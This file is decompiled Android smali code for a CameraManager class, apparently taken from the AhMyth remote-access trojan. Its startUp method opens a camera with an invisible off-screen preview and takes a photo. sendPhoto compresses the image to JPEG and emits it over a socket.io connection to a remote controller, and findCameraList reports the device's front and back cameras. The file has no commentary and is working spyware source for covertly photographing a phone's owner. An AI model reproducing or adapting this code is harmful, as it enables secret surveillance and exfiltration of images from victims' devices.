.class public Lahmyth/mine/king/ahmyth/CameraManager;
.super Ljava/lang/Object;
.source "CameraManager.java"


# instance fields
.field private camera:Landroid/hardware/Camera;

.field private context:Landroid/content/Context;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 0

    .line 26
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 27
    iput-object p1, p0, Lahmyth/mine/king/ahmyth/CameraManager;->context:Landroid/content/Context;

    return-void
.end method

.method static synthetic access$000(Lahmyth/mine/king/ahmyth/CameraManager;)V
    .locals 0

    .line 20
    invoke-direct {p0}, Lahmyth/mine/king/ahmyth/CameraManager;->releaseCamera()V

    return-void
.end method

.method static synthetic access$100(Lahmyth/mine/king/ahmyth/CameraManager;[B)V
    .locals 0

    .line 20
    invoke-direct {p0, p1}, Lahmyth/mine/king/ahmyth/CameraManager;->sendPhoto([B)V

    return-void
.end method

.method private releaseCamera()V
    .locals 1

    .line 72
    iget-object v0, p0, Lahmyth/mine/king/ahmyth/CameraManager;->camera:Landroid/hardware/Camera;

    if-eqz v0, :cond_0

    .line 73
    invoke-virtual {v0}, Landroid/hardware/Camera;->stopPreview()V

    .line 74
    iget-object v0, p0, Lahmyth/mine/king/ahmyth/CameraManager;->camera:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    const/4 v0, 0x0

    .line 75
    iput-object v0, p0, Lahmyth/mine/king/ahmyth/CameraManager;->camera:Landroid/hardware/Camera;

    :cond_0
    return-void
.end method

.method private sendPhoto([B)V
    .locals 4

    .line 56
    :try_start_0
    array-length v0, p1

    const/4 v1, 0x0

    invoke-static {p1, v1, v0}, Landroid/graphics/BitmapFactory;->decodeByteArray([BII)Landroid/graphics/Bitmap;

    move-result-object p1

    .line 57
    new-instance v0, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v0}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 58
    sget-object v2, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v3, 0x14

    invoke-virtual {p1, v2, v3, v0}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    .line 59
    new-instance p1, Lorg/json/JSONObject;

    invoke-direct {p1}, Lorg/json/JSONObject;-><init>()V

    const-string v2, "image"

    const/4 v3, 0x1

    .line 60
    invoke-virtual {p1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string v2, "buffer"

    .line 61
    invoke-virtual {v0}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v0

    invoke-virtual {p1, v2, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 62
    invoke-static {}, Lahmyth/mine/king/ahmyth/IOSocket;->getInstance()Lahmyth/mine/king/ahmyth/IOSocket;

    move-result-object v0

    invoke-virtual {v0}, Lahmyth/mine/king/ahmyth/IOSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object v0

    const-string v2, "x0000ca"

    new-array v3, v3, [Ljava/lang/Object;

    aput-object p1, v3, v1

    invoke-virtual {v0, v2, v3}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    .line 66
    invoke-virtual {p1}, Lorg/json/JSONException;->printStackTrace()V

    :goto_0
    return-void
.end method


# virtual methods
.method public findCameraList()Lorg/json/JSONObject;
    .locals 10

    .line 81
    iget-object v0, p0, Lahmyth/mine/king/ahmyth/CameraManager;->context:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    const-string v1, "android.hardware.camera"

    invoke-virtual {v0, v1}, Landroid/content/pm/PackageManager;->hasSystemFeature(Ljava/lang/String;)Z

    move-result v0

    const/4 v1, 0x0

    if-nez v0, :cond_0

    return-object v1

    .line 90
    :cond_0
    :try_start_0
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    .line 91
    new-instance v2, Lorg/json/JSONArray;

    invoke-direct {v2}, Lorg/json/JSONArray;-><init>()V

    const-string v3, "camList"

    const/4 v4, 0x1

    .line 92
    invoke-virtual {v0, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 95
    invoke-static {}, Landroid/hardware/Camera;->getNumberOfCameras()I

    move-result v3

    const/4 v5, 0x0

    :goto_0
    if-ge v5, v3, :cond_3

    .line 97
    new-instance v6, Landroid/hardware/Camera$CameraInfo;

    invoke-direct {v6}, Landroid/hardware/Camera$CameraInfo;-><init>()V

    .line 98
    invoke-static {v5, v6}, Landroid/hardware/Camera;->getCameraInfo(ILandroid/hardware/Camera$CameraInfo;)V

    .line 99
    iget v7, v6, Landroid/hardware/Camera$CameraInfo;->facing:I
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    const-string v8, "id"

    const-string v9, "name"

    if-ne v7, v4, :cond_1

    .line 100
    :try_start_1
    new-instance v6, Lorg/json/JSONObject;

    invoke-direct {v6}, Lorg/json/JSONObject;-><init>()V

    const-string v7, "Front"

    .line 101
    invoke-virtual {v6, v9, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 102
    invoke-virtual {v6, v8, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 103
    invoke-virtual {v2, v6}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    goto :goto_1

    .line 105
    :cond_1
    iget v6, v6, Landroid/hardware/Camera$CameraInfo;->facing:I

    if-nez v6, :cond_2

    .line 106
    new-instance v6, Lorg/json/JSONObject;

    invoke-direct {v6}, Lorg/json/JSONObject;-><init>()V

    const-string v7, "Back"

    .line 107
    invoke-virtual {v6, v9, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 108
    invoke-virtual {v6, v8, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 109
    invoke-virtual {v2, v6}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    goto :goto_1

    .line 112
    :cond_2
    new-instance v6, Lorg/json/JSONObject;

    invoke-direct {v6}, Lorg/json/JSONObject;-><init>()V

    const-string v7, "Other"

    .line 113
    invoke-virtual {v6, v9, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 114
    invoke-virtual {v6, v8, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 115
    invoke-virtual {v2, v6}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    :goto_1
    add-int/lit8 v5, v5, 0x1

    goto :goto_0

    :cond_3
    const-string v3, "list"

    .line 119
    invoke-virtual {v0, v3, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_0

    return-object v0

    :catch_0
    move-exception v0

    .line 123
    invoke-virtual {v0}, Lorg/json/JSONException;->printStackTrace()V

    return-object v1
.end method

.method public startUp(I)V
    .locals 2

    .line 32
    invoke-static {p1}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object p1

    iput-object p1, p0, Lahmyth/mine/king/ahmyth/CameraManager;->camera:Landroid/hardware/Camera;

    .line 33
    invoke-virtual {p1}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object p1

    .line 34
    iget-object v0, p0, Lahmyth/mine/king/ahmyth/CameraManager;->camera:Landroid/hardware/Camera;

    invoke-virtual {v0, p1}, Landroid/hardware/Camera;->setParameters(Landroid/hardware/Camera$Parameters;)V

    .line 36
    :try_start_0
    iget-object p1, p0, Lahmyth/mine/king/ahmyth/CameraManager;->camera:Landroid/hardware/Camera;

    new-instance v0, Landroid/graphics/SurfaceTexture;

    const/4 v1, 0x0

    invoke-direct {v0, v1}, Landroid/graphics/SurfaceTexture;-><init>(I)V

    invoke-virtual {p1, v0}, Landroid/hardware/Camera;->setPreviewTexture(Landroid/graphics/SurfaceTexture;)V

    .line 37
    iget-object p1, p0, Lahmyth/mine/king/ahmyth/CameraManager;->camera:Landroid/hardware/Camera;

    invoke-virtual {p1}, Landroid/hardware/Camera;->startPreview()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    .line 39
    invoke-virtual {p1}, Ljava/lang/Exception;->printStackTrace()V

    .line 42
    :goto_0
    iget-object p1, p0, Lahmyth/mine/king/ahmyth/CameraManager;->camera:Landroid/hardware/Camera;

    new-instance v0, Lahmyth/mine/king/ahmyth/CameraManager$1;

    invoke-direct {v0, p0}, Lahmyth/mine/king/ahmyth/CameraManager$1;-><init>(Lahmyth/mine/king/ahmyth/CameraManager;)V

    const/4 v1, 0x0

    invoke-virtual {p1, v1, v1, v0}, Landroid/hardware/Camera;->takePicture(Landroid/hardware/Camera$ShutterCallback;Landroid/hardware/Camera$PictureCallback;Landroid/hardware/Camera$PictureCallback;)V

    return-void
.end method
